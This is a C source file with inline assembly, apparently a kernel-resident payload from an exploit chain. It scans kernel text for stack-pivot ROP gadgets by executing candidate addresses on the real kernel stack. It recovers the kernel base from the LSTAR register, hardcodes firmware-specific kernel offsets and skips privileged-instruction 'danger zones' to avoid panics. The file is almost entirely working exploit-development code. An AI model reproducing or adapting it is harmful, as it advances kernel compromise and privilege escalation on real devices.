#include <stdint.h>

/*
 * smart_pivot_scan v4 — Safe ktext pivot gadget scanner
 *
 * CRITICAL FIX: Use the real kernel stack for probes.
 *
 * Previous versions used a 256-byte entry_stk in .bss as RSP during probes.
 * When ANY probe faulted, the CPU pushed a trap frame (~200 bytes) onto this
 * tiny stack, which overflowed into .rodata/.text → double fault → instant
 * kernel panic. This happened even with "safe" epilogue probes because
 * alignment padding/mid-instruction bytes can still decode to faulting ops.
 *
 * Fix: push resume addresses + candidate onto the REAL kernel thread stack
 * (16KB). If a probe faults, the CPU has a valid, large stack for the trap
 * handler. The thread may still die (kernel threads panic on unhandled
 * faults), but at least it won't double-fault.
 *
 * Memory layout:
 *   exec_code page (4096): code + rodata + .bss (func_list, pivot_chain, vars)
 *   kthread_args (4096):   output[0..2303] + safe_region[2304..4095]
 *   kernel stack (16KB):   probe frames pushed here
 *
 * Probing strategy: EPILOGUE — probe backwards from function boundaries.
 *   Function epilogues (pop/ret) are much safer than prologues/bodies.
 *   Pivot gadgets (48 94 C3, 50 5C C3) end with C3 (ret) = function end.
 *
 * Configure via -D flags:
 *   SCAN_BATCH:    which batch of the sorted pointer list to scan (0-based)
 *   BATCH_SIZE:    how many function boundaries per batch (default 8)
 *   PROBE_DEPTH:   bytes before each boundary to probe (default 16)
 *
 * Output layout (uint64_t indices):
 *   [0]  magic "SPVT" (0x53505654) | status(32)
 *   [1]  kdata_base
 *   [2]  ktext_base
 *   [3]  batch_id | (batch_size << 16) | (probe_depth << 32)
 *   [4]  total_probed
 *   [5]  total_survived
 *   [6]  total_skipped (danger zone hits)
 *   [7]  found_addr (pivot gadget address, or 0)
 *   [8]  found_ktext_offset (ktext-relative, or 0)
 *   [9]  n_funcs (total function entry points found)
 *   Per boundary probed (starting at index 10, 3 uint64_t each):
 *     [10+i*3+0]  boundary address (next_func)
 *     [10+i*3+1]  probed_count | (survived_count << 16) | (skipped_count << 32)
 *     [10+i*3+2]  last_probed_offset | (status << 32)
 */

#ifndef SCAN_BATCH
#define SCAN_BATCH     0
#endif
#ifndef BATCH_SIZE
#define BATCH_SIZE     8
#endif
#ifndef PROBE_DEPTH
#define PROBE_DEPTH    16
#endif

#define MAGIC_SPVT     0x53505654
#define KTEXT_SIZE     0xC00000
#define HEADER_SLOTS   10

/* Danger zones: ktext regions with privileged instructions */
typedef struct {
    int64_t  kdata_offset;
    int32_t  radius;
} danger_zone_t;

static const danger_zone_t danger_zones[] = {
    { -0x9d20cc, 16 },    /* wrmsr; ret */
    { -0x9d0cfa, 64 },    /* rdmsr sequence */
    { -0x396f9e, 16 },    /* mov cr3, rax */
    { -0x39700e, 16 },    /* mov rdi, cr3 */
    { -0x9d6d93, 48 },    /* dr2gpr */
    { -0x9d6c7a, 48 },    /* gpr2dr_1 */
    { -0x9d6b87, 48 },    /* gpr2dr_2 */
    { -0x9d6f80, 192 },   /* cpu_switch */
    { -0x9cf84c, 32 },    /* doreti_iret */
    { -0x9cf84c + 10, 32 }, /* swapgs_add_rsp_iret */
    { -0x9cf8ab, 64 },    /* pop_all_iret */
    { -0x96be70, 64 },    /* push_pop_all_iret */
    { -0x70b963, 32 },    /* kmem_alloc_rwx_fix */
    { 0, 0 }
};

/* Known ktext function entry points (kdata-relative negative offsets) */
static const int64_t known_ktext_funcs[] = {
    -0x99002a, -0x9908e0, -0x990990, -0x6824c0, -0x8a5c40,
    -0x631ea9, -0x802311, -0xa9b00,  -0x8a54cd, -0x8a52c3,
    -0x8a47d2, -0x8ed940, -0x479d60, -0x9cf990, -0xc1ed0,
    -0x35ebf0, -0x90ac61, -0x2cd31d, -0x1df2ce, -0x85a312,
    -0x6c2989, -0x8a58bc, -0x8a5541, -0x8a5014, -0x8a488c,
    -0x8a5cbe, -0x94a7f0, -0x94ada4, -0x94ad2e, -0x94aaa0,
    -0x21020,  -0x2cc918,
    0
};

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

/* ── .bss globals for asm (RIP-relative) ── */
static volatile uint64_t scan_saved_rsp;
static volatile uint64_t scan_resume_pivot;
static volatile int scan_got_pivot;
static volatile uint64_t scan_candidate;
static volatile uint64_t safe_addr;
static volatile uint64_t pivot_chain[8];
/* NO entry_stk — probes use the real kernel stack */

static uint64_t func_list[96];

__attribute__((naked, used))
static void pivot_landing(void)
{
    __asm__ volatile(
        "movq $1, scan_got_pivot(%%rip)\n\t"
        "movq scan_saved_rsp(%%rip), %%rsp\n\t"
        "jmpq *scan_resume_pivot(%%rip)\n\t"
        ::: "memory"
    );
}

static int is_dangerous(uint64_t addr, uint64_t kdata_base)
{
    for (int i = 0; danger_zones[i].radius != 0; i++) {
        uint64_t center = kdata_base + danger_zones[i].kdata_offset;
        int64_t dist = (int64_t)(addr - center);
        if (dist < 0) dist = -dist;
        if (dist < danger_zones[i].radius)
            return 1;
    }
    return 0;
}

static void sort_u64(uint64_t* arr, int n)
{
    for (int i = 1; i < n; i++) {
        uint64_t key = arr[i];
        int j = i - 1;
        while (j >= 0 && arr[j] > key) {
            arr[j + 1] = arr[j];
            j--;
        }
        arr[j + 1] = key;
    }
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t ktext_end = ktext_base + KTEXT_SIZE;
    uint64_t nop_ret = kdata_base + (-0x9d20cc) + 2;

    volatile uint64_t* out = (volatile uint64_t*)args;

    for (int i = 0; i < 2304/8; i++)
        out[i] = 0;

    out[0] = ((uint64_t)0xAAAA << 32) | MAGIC_SPVT;
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = (uint64_t)SCAN_BATCH | ((uint64_t)BATCH_SIZE << 16) |
             ((uint64_t)PROBE_DEPTH << 32);

    /* Safe region in kthread_args tail (bytes 2304..4095) */
    volatile uint64_t* safe_region = (volatile uint64_t*)((uint8_t*)args + 2304);
    for (int i = 0; i < (4096 - 2304) / 8; i++)
        safe_region[i] = nop_ret;
    safe_addr = (uint64_t)((uint8_t*)args + 2304 + 896);

    /* Build sorted function list */
    int n_funcs = 0;

    for (int i = 0; known_ktext_funcs[i] != 0; i++) {
        uint64_t addr = kdata_base + known_ktext_funcs[i];
        if (addr >= ktext_base && addr < ktext_end && n_funcs < 96)
            func_list[n_funcs++] = addr;
    }

    volatile uint8_t* idt = (volatile uint8_t*)(kdata_base + 0x64cdc80);
    for (int i = 0; i < 256 && n_funcs < 96; i++) {
        uint16_t off_lo  = *(volatile uint16_t*)(idt + i*16 + 0);
        uint16_t off_mid = *(volatile uint16_t*)(idt + i*16 + 6);
        uint32_t off_hi  = *(volatile uint32_t*)(idt + i*16 + 8);
        uint64_t handler = (uint64_t)off_lo | ((uint64_t)off_mid << 16) |
                           ((uint64_t)off_hi << 32);
        if (handler >= ktext_base && handler < ktext_end) {
            int dup = 0;
            for (int j = 0; j < n_funcs; j++)
                if (func_list[j] == handler) { dup = 1; break; }
            if (!dup) func_list[n_funcs++] = handler;
        }
    }

    volatile uint64_t* apic_ops = (volatile uint64_t*)(kdata_base + 0x1656b0);
    for (int i = 0; i < 28 && n_funcs < 96; i++) {
        uint64_t fn = apic_ops[i];
        if (fn >= ktext_base && fn < ktext_end) {
            int dup = 0;
            for (int j = 0; j < n_funcs; j++)
                if (func_list[j] == fn) { dup = 1; break; }
            if (!dup) func_list[n_funcs++] = fn;
        }
    }

    sort_u64(func_list, n_funcs);
    out[9] = n_funcs;

    int batch_start = SCAN_BATCH * BATCH_SIZE;
    int batch_end = batch_start + BATCH_SIZE;
    if (batch_start >= n_funcs) {
        out[0] = ((uint64_t)0xFFFF << 32) | MAGIC_SPVT;
        out[4] = n_funcs;
        return 0;
    }
    if (batch_end > n_funcs)
        batch_end = n_funcs;

    pivot_chain[0] = nop_ret;
    pivot_chain[1] = nop_ret;
    pivot_chain[2] = (uint64_t)pivot_landing;
    pivot_chain[3] = nop_ret;
    pivot_chain[4] = nop_ret;
    pivot_chain[5] = nop_ret;
    pivot_chain[6] = nop_ret;
    pivot_chain[7] = nop_ret;

    int total_probed = 0;
    int total_survived = 0;
    int total_skipped = 0;

    for (int fi = batch_start; fi < batch_end; fi++) {
        uint64_t func_entry = func_list[fi];
        int func_idx = fi - batch_start;
        int func_probed = 0;
        int func_survived = 0;
        int func_skipped = 0;
        int func_slot = HEADER_SLOTS + func_idx * 3;

        if (fi + 1 >= n_funcs)
            continue;

        uint64_t next_func = func_list[fi + 1];
        int64_t gap = next_func - func_entry;
        if (gap <= 0 || gap > 0x10000)
            continue;

        int depth = PROBE_DEPTH;
        if (depth > (int)gap)
            depth = (int)gap;

        if (func_slot + 2 < 2304/8) {
            out[func_slot + 0] = next_func;
            out[func_slot + 1] = 0;
            out[func_slot + 2] = 0;
        }

        for (int off = 1; off <= depth; off++) {
            uint64_t candidate = next_func - off;

            if (is_dangerous(candidate, kdata_base)) {
                func_skipped++;
                total_skipped++;
                continue;
            }

            func_probed++;
            total_probed++;
            out[4] = total_probed;
            if (func_slot + 2 < 2304/8)
                out[func_slot + 2] = (uint64_t)off | ((uint64_t)0xBBBB << 32);

            scan_got_pivot = 0;
            scan_candidate = candidate;

            /*
             * PROBE using the REAL kernel stack.
             *
             * Push 8 resume addresses + candidate onto the real stack.
             * This way RSP stays on the 16KB kernel stack during the probe.
             * If the candidate faults, the CPU has a valid stack for the
             * trap frame → no double fault.
             *
             * The 8 resume addresses handle candidates with up to 7
             * pop instructions before ret (pop;pop;...;ret patterns).
             */
            __asm__ volatile(
                /* Save RSP (on real kernel stack) */
                "movq %%rsp, scan_saved_rsp(%%rip)\n\t"

                /* Set pivot resume target */
                "leaq 2f(%%rip), %%rcx\n\t"
                "movq %%rcx, scan_resume_pivot(%%rip)\n\t"

                /* Push 8 resume addresses onto real kernel stack */
                "leaq 1f(%%rip), %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"
                "pushq %%rcx\n\t"

                /* Push candidate address */
                "movq scan_candidate(%%rip), %%rcx\n\t"
                "pushq %%rcx\n\t"

                /* Set all registers (except RAX, RSP) to safe_addr */
                "movq safe_addr(%%rip), %%rdi\n\t"
                "movq %%rdi, %%rsi\n\t"
                "movq %%rdi, %%rdx\n\t"
                "movq %%rdi, %%rcx\n\t"
                "movq %%rdi, %%rbx\n\t"
                "movq %%rdi, %%rbp\n\t"
                "movq %%rdi, %%r8\n\t"
                "movq %%rdi, %%r9\n\t"
                "movq %%rdi, %%r10\n\t"
                "movq %%rdi, %%r11\n\t"
                "movq %%rdi, %%r12\n\t"
                "movq %%rdi, %%r13\n\t"
                "movq %%rdi, %%r14\n\t"
                "movq %%rdi, %%r15\n\t"

                "cld\n\t"

                /* RAX = pivot_chain */
                "leaq pivot_chain(%%rip), %%rax\n\t"

                /* Go! RSP is on real kernel stack. retq pops candidate. */
                "retq\n\t"

                /* Normal resume: candidate returned */
                "1:\n\t"
                "movq scan_saved_rsp(%%rip), %%rsp\n\t"
                "jmp 3f\n\t"

                /* Pivot resume: candidate pivoted RSP */
                "2:\n\t"
                "movq scan_saved_rsp(%%rip), %%rsp\n\t"

                "3:\n\t"
                ::: "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
                    "r8", "r9", "r10", "r11", "r12", "r13", "r14", "r15",
                    "rbp", "memory", "cc"
            );

            if (scan_got_pivot) {
                out[7] = candidate;
                out[8] = candidate - ktext_base;
                out[0] = ((uint64_t)0x0002 << 32) | MAGIC_SPVT;
                out[5] = total_survived;
                out[6] = total_skipped;
                if (func_slot + 2 < 2304/8) {
                    out[func_slot + 1] = (uint64_t)func_probed |
                                         ((uint64_t)func_survived << 16) |
                                         ((uint64_t)func_skipped << 32);
                    out[func_slot + 2] = (uint64_t)off | ((uint64_t)0x4849 << 32);
                }
                return 0;
            }

            func_survived++;
            total_survived++;
        }

        if (func_slot + 2 < 2304/8) {
            out[func_slot + 1] = (uint64_t)func_probed |
                                 ((uint64_t)func_survived << 16) |
                                 ((uint64_t)func_skipped << 32);
            out[func_slot + 2] = (uint64_t)depth |
                                 ((uint64_t)0x0001 << 32);
        }
    }

    out[0] = ((uint64_t)0x0001 << 32) | MAGIC_SPVT;
    out[4] = total_probed;
    out[5] = total_survived;
    out[6] = total_skipped;

    return 0;
}
